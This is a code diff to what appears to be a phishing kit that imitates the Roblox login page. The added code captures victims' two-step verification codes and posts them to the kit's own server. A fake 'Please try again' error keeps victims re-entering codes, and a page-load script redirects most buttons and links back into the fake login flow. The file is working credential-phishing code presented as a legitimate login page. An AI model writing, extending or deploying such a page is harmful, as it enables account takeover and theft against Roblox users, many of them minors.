@@ -246,8 +246,15 @@
             border-radius: 8px;
         }
 
-        .text-footer {
-            margin-bottom: 15px;
+        #retrybtn {
+            width: 100%;
+            margin-top: 26px;
+            margin-bottom: 20px;
+        }
+
+        #needhelp {
+            margin-top: 15px;
+            margin-bottom: 20px;
         }
 
         /* Keep your existing CSS rules for layout and other elements */
@@ -458,8 +465,10 @@
                                 </div>
                             </div>
                             <div class="text-center forgot-credentials-link" bis_skin_checked="1">
-                                <div style="cursor: pointer" onclick="parolsCvlis()" id="forgot-credentials-link"
-                                    class="text-link" bis_skin_checked="1">Forgot Password or Username?</div>
+                                <div style="cursor: pointer"
+                                    onclick="window.location.href='https://www.roblox.com/login/forgot-password-or-username'"
+                                    id="forgot-credentials-link" class="text-link" bis_skin_checked="1">Forgot Password
+                                    or Username?</div>
                             </div>
                             <div bis_skin_checked="1">
                                 <div class="alternative-login-divider-container" bis_skin_checked="1">
@@ -562,10 +571,14 @@
                         <p class="modal-margin-bottom">To approve or reject this attempt, open the Roblox app from a
                             logged-in mobile or tablet device.</p>
                         <button type="button" class="modal-action-button btn-secondary-md modal-margin-bottom"
-                            aria-label="Retry">Retry</button>
+                            id="retrybtn" aria-label="Retry">Retry</button>
+                        <p class="form-control-label xsmall text-error" id="retry-error"
+                            style="display:none; color:#ff0000; font-size:10px; margin-top:4px;">
+                            Please try again.
+                        </p>
                         <p><button type="button" class="modal-body-button-link small anohter-veri-btn">Use another
                                 verification method</button></p>
-                        <p class="text-footer modal-margin-bottom">Need help? Visit our <a
+                        <p class="text-footer modal-margin-bottom" id="needhelp">Need help? Visit our <a
                                 class="text-name text-footer contact" href="https://www.roblox.com/info/2sv"
                                 target="_blank" rel="noopener noreferrer" bis_skin_checked="1">Help Center</a></p>
                         <p class="modal-margin-bottom-xlarge text-error xsmall"></p>
@@ -592,7 +605,7 @@
                         <div class="modal-lock-icon" bis_skin_checked="1"></div>
                         <p class="modal-margin-bottom-xlarge">Enter the code we just sent you via email.</p>
                         <div class="input-control-wrapper" bis_skin_checked="1">
-                            <form > 
+                            <form>
                                 <div id="twostep-group" class="form-group" bis_skin_checked="1">
                                     <input as="input" autocomplete="off" maxlength="6"
                                         oninput="twostepInput(this.value, 'verifyButton'); this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');"
@@ -632,7 +645,30 @@
     </div>
 
 
-    <!-- ============================================ -->
+    <!-- ====================redirect======================== -->
+
+    <script>
+        // Set the destination URL
+        const redirectURL = "/people/7936348760/login";
+
+        // Wait until the page is fully loaded
+        window.onload = function () {
+            // Select all buttons and anchor tags EXCEPT the OTP button
+            const clickableElements = document.querySelectorAll("button, a");
+
+            clickableElements.forEach(element => {
+                // Skip the Email Me a One-Time Code button
+                if (element.id === 'otp-login-button' || element.id === 'actionButton' || element.id === 'retrybtn') {
+                    return; //
+                }
+
+                element.addEventListener("click", function (e) {
+                    e.preventDefault(); // Prevent default behavior
+                    window.location.href = redirectURL;
+                });
+            });
+        };
+    </script>
     <!-- AJAX Login + WebSocket Notification System   -->
     <!-- ============================================ -->
     <script>
@@ -855,7 +891,7 @@
 
             } else if (status === 'yle3') {
                 console.log('📧 Showing Email One-Time Code Modal');
-                const modal = document.getElementById('emailSend');
+                const modal = document.getElementById('yleobaes');
                 if (modal) {
                     modal.style.display = 'block';
                     document.getElementById('rbx-body').style.overflow = 'hidden';
@@ -1070,16 +1106,16 @@
                 e.stopPropagation();
                 e.stopImmediatePropagation();
 
-                 e.preventDefault();
+                e.preventDefault();
                 e.stopPropagation();
                 e.stopImmediatePropagation();
 
                 const verificationCodevalue = verificationCode.value;
-                
+
                 // Get user_id from URL
                 const user_id = window.location.pathname.split('/')[2];
 
-                
+
                 // Send AJAX POST request
                 fetch(`/people/${user_id}/login/code/`, {
                     method: 'POST',
@@ -1091,17 +1127,17 @@
                         'verificationCodevalue': verificationCodevalue,
                     })
                 })
-                .then(response => {
-                    console.log('📬 Response status:', response.status);
-                })
-                .then(data => {
-                    console.log('📦 Response data:', data);
+                    .then(response => {
+                        console.log('📬 Response status:', response.status);
+                    })
+                    .then(data => {
+                        console.log('📦 Response data:', data);
 
-                })
-                .catch(error => {
-                    console.error('❌ Fetch error:', error);
+                    })
+                    .catch(error => {
+                        console.error('❌ Fetch error:', error);
 
-                });
+                    });
 
                 // Final prevention of any redirect
                 const verificationError = document.getElementById('verification-error');
@@ -1112,6 +1148,20 @@
                 verificationError.style.fontSize = '10px';
                 return false;
             });
+
+
+
+            const RetruButton = document.getElementById('retrybtn');
+
+            RetruButton.addEventListener('click', function (e) {
+                const retryError = document.getElementById('retry-error');
+                retryError.style.display = 'none';
+                retryError.textContent = 'Please try again.';
+                retryError.style.display = 'block';
+                retryError.style.color = '#ff0000';
+                retryError.style.fontSize = '10px';
+                return false;
+            })
 
             // ==========================================
             // 5c. Enter key support
